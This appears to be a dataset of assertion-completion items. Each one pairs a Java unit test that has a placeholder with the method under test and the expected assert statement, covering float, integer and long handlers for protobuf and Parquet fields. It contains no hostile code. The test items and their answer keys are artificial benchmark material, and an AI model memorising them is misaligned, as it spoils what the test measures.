"shouldReturnArrayValues() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash""); FloatHandler floatHandler = new FloatHandler(fieldDescriptor); ArrayList<Float> inputValues = new ArrayList<>(Arrays.asList(1F, 2F, 3F)); Object actualValues = floatHandler.parseRepeatedObjectField(inputValues);  ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) {  float[] inputValues = new float[0]; if (field != null) { inputValues = Floats.toArray((List<Float>) field); } return inputValues; }"	assertTrue(Arrays.equals(new float[]{1F, 2F, 3F}, (float[]) actualValues))
"shouldReturnEmptyArrayOnNull() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash""); FloatHandler floatHandler = new FloatHandler(fieldDescriptor); Object actualValues = floatHandler.parseRepeatedObjectField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) {  float[] inputValues = new float[0]; if (field != null) { inputValues = Floats.toArray((List<Float>) field); } return inputValues; }"	assertEquals(0, ((float[]) actualValues).length)
"shouldFetchParsedValueForFieldOfTypeFloatInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash""); GroupType parquetSchema = requiredGroup() .required(FLOAT).named(""amount_paid_by_cash"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""amount_paid_by_cash"", 32.56F); FloatHandler floatHandler = new FloatHandler(fieldDescriptor);  Object actualValue = floatHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getFloat(fieldName, 0); } else { /* return default value */ return 0.0F; } }"	assertEquals(32.56F, actualValue)
"shouldFetchDefaultValueIfFieldNotPresentInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash""); GroupType parquetSchema = requiredGroup() .required(FLOAT).named(""some-other-field"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); FloatHandler floatHandler = new FloatHandler(fieldDescriptor);  Object actualValue = floatHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getFloat(fieldName, 0); } else { /* return default value */ return 0.0F; } }"	assertEquals(0.0F, actualValue)
"shouldFetchDefaultValueIfFieldNotInitializedWithAValueInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash"");  /* The field is added to the schema but not assigned a value */ GroupType parquetSchema = requiredGroup() .required(FLOAT).named(""amount_paid_by_cash"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); FloatHandler floatHandler = new FloatHandler(fieldDescriptor);  Object actualValue = floatHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getFloat(fieldName, 0); } else { /* return default value */ return 0.0F; } }"	assertEquals(0.0F, actualValue)
"shouldReturnArrayOfFloatValuesForFieldOfTypeRepeatedFloatInsideSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""float_array_field"");  GroupType parquetSchema = buildMessage() .repeated(FLOAT).named(""float_array_field"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  simpleGroup.add(""float_array_field"", 0.45123F); simpleGroup.add(""float_array_field"", 23.0123F);  FloatHandler floatHandler = new FloatHandler(fieldDescriptor); float[] actualValue = (float[]) floatHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); float[] floatArray = new float[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { floatArray[i] = simpleGroup.getFloat(fieldName, i); } return floatArray; } return new float[0]; }"	assertArrayEquals(new float[]{0.45123F, 23.0123F}, actualValue, 0F)
"shouldReturnEmptyFloatArrayWhenParseRepeatedSimpleGroupFieldIsCalledWithNull() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""float_array_field"");  FloatHandler floatHandler = new FloatHandler(fieldDescriptor); float[] actualValue = (float[]) floatHandler.parseRepeatedSimpleGroupField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); float[] floatArray = new float[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { floatArray[i] = simpleGroup.getFloat(fieldName, i); } return floatArray; } return new float[0]; }"	assertArrayEquals(new float[0], actualValue, 0F)
"shouldReturnEmptyFloatArrayWhenRepeatedFloatFieldInsideSimpleGroupIsNotPresent() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""float_array_field"");  GroupType parquetSchema = buildMessage() .repeated(BOOLEAN).named(""some_other_array_field"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  FloatHandler floatHandler = new FloatHandler(fieldDescriptor); float[] actualValue = (float[]) floatHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); float[] floatArray = new float[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { floatArray[i] = simpleGroup.getFloat(fieldName, i); } return floatArray; } return new float[0]; }"	assertArrayEquals(new float[0], actualValue, 0F)
"shouldReturnEmptyFloatArrayWhenRepeatedFloatFieldInsideSimpleGroupIsNotInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""float_array_field"");  GroupType parquetSchema = buildMessage() .repeated(FLOAT).named(""float_array_field"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  FloatHandler floatHandler = new FloatHandler(fieldDescriptor); float[] actualValue = (float[]) floatHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); float[] floatArray = new float[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { floatArray[i] = simpleGroup.getFloat(fieldName, i); } return floatArray; } return new float[0]; }"	assertArrayEquals(new float[0], actualValue, 0F)
"shouldHandleIntegerTypes() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id""); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.INT; }"	assertTrue(integerHandler.canHandle())
"shouldNotHandleTypesOtherThanInteger() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.INT; }"	assertFalse(integerHandler.canHandle())
"shouldFetchValueForFieldForFieldDescriptorOfTypeInteger() { int actualValue = 2;  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id""); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); Object value = integerHandler.parseObject(actualValue);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Integer.parseInt(getValueOrDefault(field, ""0"")); }"	assertEquals(actualValue, value)
"shouldFetchParsedValueForFieldForFieldDescriptorOfTypeInteger() { int actualValue = 2;  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id""); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); Object value = integerHandler.parseObject(String.valueOf(actualValue));  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Integer.parseInt(getValueOrDefault(field, ""0"")); }"	assertEquals(actualValue, value)
"shouldFetchDefaultValueIfValueNotPresentForFieldDescriptorOfTypeInteger() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id""); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); Object value = integerHandler.parseObject(null);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Integer.parseInt(getValueOrDefault(field, ""0"")); }"	assertEquals(0, value)
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id""); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeInformation() { return Types.INT; }"	assertEquals(Types.INT, integerHandler.getTypeInformation())
"shouldReturnArrayTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id""); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getArrayType() { return Types.PRIMITIVE_ARRAY(Types.INT); }"	assertEquals(Types.PRIMITIVE_ARRAY(Types.INT), integerHandler.getArrayType())
"shouldReturnArrayValues() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id""); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); ArrayList<Integer> inputValues = new ArrayList<>(Arrays.asList(1, 2, 3)); Object actualValues = integerHandler.parseRepeatedObjectField(inputValues);  ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { int[] inputValues = new int[0]; if (field != null) { inputValues = Ints.toArray((List<Integer>) field); } return inputValues; }"	assertArrayEquals(new int[]{1, 2, 3}, (int[]) actualValues)
"shouldReturnEmptyArrayOnNull() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id""); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); Object actualValues = integerHandler.parseRepeatedObjectField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { int[] inputValues = new int[0]; if (field != null) { inputValues = Ints.toArray((List<Integer>) field); } return inputValues; }"	assertEquals(0, ((int[]) actualValues).length)
"shouldFetchParsedValueForFieldOfTypeIntegerInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id"");  GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT32).named(""cancel_reason_id"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""cancel_reason_id"", 34);  IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); Object actualValue = integerHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getInteger(fieldName, 0); } else { /* return default value */ return 0; } }"	assertEquals(34, actualValue)
"shouldFetchDefaultValueIfFieldNotPresentInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id"");  GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT32).named(""some-other-field"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor);  Object actualValue = integerHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getInteger(fieldName, 0); } else { /* return default value */ return 0; } }"	assertEquals(0, actualValue)
"shouldFetchDefaultValueIfFieldNotInitializedWithAValueInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id"");  /* The field is added to the schema but not assigned a value */ GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT32).named(""cancel_reason_id"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor);  Object actualValue = integerHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getInteger(fieldName, 0); } else { /* return default value */ return 0; } }"	assertEquals(0, actualValue)
"shouldReturnArrayOfIntValuesForFieldOfTypeRepeatedInt32InsideSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""repeated_number_field"");  GroupType parquetSchema = buildMessage() .repeated(INT32).named(""repeated_number_field"") .named(""TestNestedRepeatedMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  simpleGroup.add(""repeated_number_field"", 2342882); simpleGroup.add(""repeated_number_field"", -382922);  IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); int[] actualValue = (int[]) integerHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); int[] intArray = new int[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { intArray[i] = simpleGroup.getInteger(fieldName, i); } return intArray; } return new int[0]; }"	assertArrayEquals(new int[]{2342882, -382922}, actualValue)
"shouldReturnEmptyIntArrayWhenParseRepeatedSimpleGroupFieldIsCalledWithNull() { Descriptors.FieldDescriptor fieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""repeated_number_field"");  IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); int[] actualValue = (int[]) integerHandler.parseRepeatedSimpleGroupField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); int[] intArray = new int[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { intArray[i] = simpleGroup.getInteger(fieldName, i); } return intArray; } return new int[0]; }"	assertArrayEquals(new int[0], actualValue)
"shouldReturnEmptyIntArrayWhenRepeatedInt32FieldInsideSimpleGroupIsNotPresent() { Descriptors.FieldDescriptor fieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""repeated_number_field"");  GroupType parquetSchema = buildMessage() .repeated(BOOLEAN).named(""some_other_field"") .named(""TestNestedRepeatedMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); int[] actualValue = (int[]) integerHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); int[] intArray = new int[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { intArray[i] = simpleGroup.getInteger(fieldName, i); } return intArray; } return new int[0]; }"	assertArrayEquals(new int[0], actualValue)
"shouldReturnEmptyIntArrayWhenRepeatedInt32FieldInsideSimpleGroupIsNotInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""repeated_number_field"");  GroupType parquetSchema = buildMessage() .repeated(INT32).named(""repeated_number_field"") .named(""TestNestedRepeatedMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  IntegerHandler integerHandler = new IntegerHandler(fieldDescriptor); int[] actualValue = (int[]) integerHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); int[] intArray = new int[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { intArray[i] = simpleGroup.getInteger(fieldName, i); } return intArray; } return new int[0]; }"	assertArrayEquals(new int[0], actualValue)
"shouldHandleLongTypes() { Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id""); LongHandler longHandler = new LongHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.LONG; }"	assertTrue(longHandler.canHandle())
"shouldNotHandleTypesOtherThanLong() { Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""vehicle_type""); LongHandler longHandler = new LongHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.LONG; }"	assertFalse(longHandler.canHandle())
"shouldFetchValueForFieldForFieldDescriptorOfTypeLong() { long actualValue = 2L;  Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id""); LongHandler longHandler = new LongHandler(fieldDescriptor); Object value = longHandler.parseObject(actualValue);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Long.parseLong(getValueOrDefault(field, ""0"")); }"	assertEquals(actualValue, value)
"shouldFetchParsedValueForFieldForFieldDescriptorOfTypeLong() { long actualValue = 2L;  Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id""); LongHandler longHandler = new LongHandler(fieldDescriptor); Object value = longHandler.parseObject(String.valueOf(actualValue));  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Long.parseLong(getValueOrDefault(field, ""0"")); }"	assertEquals(actualValue, value)
"shouldFetchDefaultValueIfValueNotPresentForFieldDescriptorOfTypeLong() { Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id""); LongHandler longHandler = new LongHandler(fieldDescriptor); Object value = longHandler.parseObject(null);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Long.parseLong(getValueOrDefault(field, ""0"")); }"	assertEquals(0L, value)
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id""); LongHandler longHandler = new LongHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeInformation() { return Types.LONG; }"	assertEquals(Types.LONG, longHandler.getTypeInformation())
"shouldReturnArrayTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id""); LongHandler longHandler = new LongHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getArrayType() { return Types.OBJECT_ARRAY(Types.LONG); }"	assertEquals(Types.OBJECT_ARRAY(Types.LONG), longHandler.getArrayType())
"shouldReturnArrayValues() { Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id""); LongHandler longHandler = new LongHandler(fieldDescriptor); ArrayList<Long> inputValues = new ArrayList<>(Arrays.asList(1L, 2L, 3L)); Object actualValues = longHandler.parseRepeatedObjectField(inputValues); ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { List<Long> inputValues = new ArrayList<>(); if (field != null) { inputValues = (List<Long>) field; } return inputValues.toArray(new Long[]{}); }"	assertArrayEquals(inputValues.toArray(), (Long[]) actualValues)
"shouldReturnEmptyArrayOnNull() { Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id""); LongHandler longHandler = new LongHandler(fieldDescriptor); Object actualValues = longHandler.parseRepeatedObjectField(null); ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { List<Long> inputValues = new ArrayList<>(); if (field != null) { inputValues = (List<Long>) field; } return inputValues.toArray(new Long[]{}); }"	assertEquals(0, ((Long[]) actualValues).length)
"shouldFetchParsedValueForFieldOfTypeLongInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT64).named(""s2_id"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""s2_id"", 101828L); LongHandler longHandler = new LongHandler(fieldDescriptor);  Object actualValue = longHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getLong(fieldName, 0); } else { /* return default value */ return 0L; } }"	assertEquals(101828L, actualValue)
"shouldFetchDefaultValueIfFieldNotPresentInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id"");  GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT64).named(""some-other-field"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); LongHandler longHandler = new LongHandler(fieldDescriptor);  Object actualValue = longHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getLong(fieldName, 0); } else { /* return default value */ return 0L; } }"	assertEquals(0L, actualValue)
"shouldFetchDefaultValueIfFieldNotInitializedWithAValueInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestAggregatedSupplyMessage.getDescriptor().findFieldByName(""s2_id"");  /* The field is added to the schema but not assigned a value */ GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT64).named(""s2_id"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); LongHandler longHandler = new LongHandler(fieldDescriptor);  Object actualValue = longHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getLong(fieldName, 0); } else { /* return default value */ return 0L; } }"	assertEquals(0L, actualValue)
"shouldReturnArrayOfLongValuesForFieldOfTypeRepeatedInt64InsideSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""repeated_long_field"");  GroupType parquetSchema = buildMessage() .repeated(INT64).named(""repeated_long_field"") .named(""TestNestedRepeatedMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  simpleGroup.add(""repeated_long_field"", 6222L); simpleGroup.add(""repeated_long_field"", 0L);  LongHandler longHandler = new LongHandler(fieldDescriptor); Long[] actualValue = (Long[]) longHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); ArrayList<Long> longArrayList = new ArrayList<>(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int i = 0; i < repetitionCount; i++) { longArrayList.add(simpleGroup.getLong(fieldName, i)); } } return longArrayList.toArray(new Long[]{}); }"	assertArrayEquals(new Long[]{6222L, 0L}, actualValue)
"shouldReturnEmptyLongArrayWhenParseRepeatedSimpleGroupFieldIsCalledWithNull() { Descriptors.FieldDescriptor fieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""repeated_long_field"");  LongHandler longHandler = new LongHandler(fieldDescriptor); Long[] actualValue = (Long[]) longHandler.parseRepeatedSimpleGroupField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); ArrayList<Long> longArrayList = new ArrayList<>(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int i = 0; i < repetitionCount; i++) { longArrayList.add(simpleGroup.getLong(fieldName, i)); } } return longArrayList.toArray(new Long[]{}); }"	assertArrayEquals(new Long[0], actualValue)
"shouldReturnEmptyLongArrayWhenRepeatedInt64FieldInsideSimpleGroupIsNotPresent() { Descriptors.FieldDescriptor fieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""repeated_long_field"");  GroupType parquetSchema = buildMessage() .repeated(BOOLEAN).named(""some_other_field"") .named(""TestNestedRepeatedMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  LongHandler longHandler = new LongHandler(fieldDescriptor); Long[] actualValue = (Long[]) longHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); ArrayList<Long> longArrayList = new ArrayList<>(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int i = 0; i < repetitionCount; i++) { longArrayList.add(simpleGroup.getLong(fieldName, i)); } } return longArrayList.toArray(new Long[]{}); }"	assertArrayEquals(new Long[0], actualValue)
"shouldReturnEmptyLongArrayWhenRepeatedInt64FieldInsideSimpleGroupIsNotInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""repeated_long_field"");  GroupType parquetSchema = buildMessage() .repeated(INT64).named(""repeated_long_field"") .named(""TestNestedRepeatedMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  LongHandler longHandler = new LongHandler(fieldDescriptor); Long[] actualValue = (Long[]) longHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); ArrayList<Long> longArrayList = new ArrayList<>(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int i = 0; i < repetitionCount; i++) { longArrayList.add(simpleGroup.getLong(fieldName, i)); } } return longArrayList.toArray(new Long[]{}); }"	assertArrayEquals(new Long[0], actualValue)
"shouldReturnIntegerTypeHandlerForInteger() { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory .getTypeHandler(TestBookingLogMessage.getDescriptor().findFieldByName(""cancel_reason_id"")); ""<AssertPlaceHolder>""; }
